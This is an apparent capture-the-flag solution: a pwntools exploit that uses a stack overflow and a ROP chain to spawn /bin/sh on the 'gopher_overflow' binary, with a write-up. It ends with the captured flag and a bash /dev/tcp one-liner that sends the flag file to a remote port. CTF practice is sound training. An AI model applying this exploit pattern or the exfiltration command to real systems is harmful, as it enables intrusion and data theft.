from pwn import *
import sys
import time


# context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i)
        for i in __import__("subprocess")
        .check_output(["one_gadget", "--raw", filename])
        .decode()
        .split(" ")
    ]


# brva x = b *(pie+x)
# set follow-fork-mode
# p/x $fs_base
# vis_heap_chunks
if len(sys.argv) == 1:
    r = process("./gopher_overflow")
    if args.GDB:
        # gdb.attach(r,'b *0x464198\nb *0x43a69a\nb *0x43a237\nb *0x4385c0\n b *0x000000000047cf91') # 8
        gdb.attach(r, "b *0x000000000047cf91\nb *0x47cfbe\nb *0x4036cc")  # 8
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)

rop = b""
rop += p64(0x000000000040c5bf)  # 0x000000000040c5bf: pop rcx; sal edx, 0xf; sub al, 0xc0; inc eax; ret;
rop += b"/bin/sh\x00"
rop += p64(0x0000000000415093)  # 0x0000000000415093: pop rax; adc al, 0xf6; ret;
rop += p64(0x000000000011E600 + 0x0000000000400000)
rop += p64(0x000000000042cb73)  # 0x000000000042cb73: mov qword ptr [rax], rcx; ret;


# Filled registers
rop += p64(0x000000000047a67a)  # 0x000000000047a67a: pop rdx; ret;
rop += p64(0x51F217)
rop += p64(0x0000000000404968)  # 0x0000000000404968: pop rax; pop rbp; ret;
rop += p64(0x000000000000003B)
rop += p64(0xDEADBEEFDEADBEEF)
rop += p64(0x0000000000404AA1) # pop rbx ; ret
rop += p64(0x51E6F7)
rop += p64(0x00000000004036C9) # mov rdi, rbx ; syscall
# rop += rebase_0(0x000000000005E5E9)  # 0x000000000045e5e9: syscall; ret;
# r.sendline(cyclic(24) + rop)

r.sendline(
    b"A" * 24
    + p64(0xDEADBEEF)
    + p64(0x000000C000124D0A)
    + p64(0x200)
    + p64(0x200)
    + p64(0x000000C00012E000)
    + p64(0x0000000000001000) * 2
    + p64(0x00000000004B5438)
    + p64(0x000000C000116000)
    + p64(0) * 4
    + p64(0xFFFFFFFFFFFFFFFF) * 2
    + p64(0x000000C00012E000)
    + p64(0x0000000000001000) * 2
    + p64(0x00000000004B5438)
    + p64(0x000000C000116000)
    + p64(0x21) * 2
    + p64(0) * 2
    + p64(0xA)
    + p64(0xFFFFFFFFFFFFFFFF)
    + p64(0x000000C000124F30)
    + rop
)
r.interactive()

"""
Writeup:
My trial-and-error solution for gopher overflow:

It's trivial that we can overwrite the return address, however you'll corrupt some other values used by other functions on the stack.
So we can just directly copy all the data on the stack before the return address to "pretend" we didn't overflow. The rest is rop.
We can write "/bin/sh" string by
```python
rop = b""
rop += rebase_0(
    0x000000000000C5BF
)  # 0x000000000040c5bf: pop rcx; sal edx, 0xf; sub al, 0xc0; inc eax; ret;
rop += b"/bin/sh\x00"
rop += rebase_0(0x0000000000015093)  # 0x0000000000415093: pop rax; adc al, 0xf6; ret;
rop += rebase_0(0x000000000011E600)
rop += rebase_0(
    0x000000000002CB73
)  # 0x000000000042cb73: mov qword ptr [rax], rcx; ret;
```
We can control rdx by pop; ret gadget. 
```
0x0000000000404968 : pop rax ; pop rbp ; ret
0x0000000000401031 : pop rbp ; ret
0x0000000000404aa1 : pop rbx ; ret
0x000000000047a67a : pop rdx ; ret
0x0000000000401032 : ret
```
What about rdi?
We can use `mov rdi, rbx ; syscall` at 0x4036C9!
Therefore the final part of our rop chain is
```
pop rbx ; ret
"bin/sh"
mov rdi, rbx ; syscall
```
Luckily rsi is pointing to somewhere 0 before syscall, and that's it.
"""


"""
cat /home/`whoami`/f*
flag{5e09da8b79efaeb2620a667947a8973d}


In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
"""
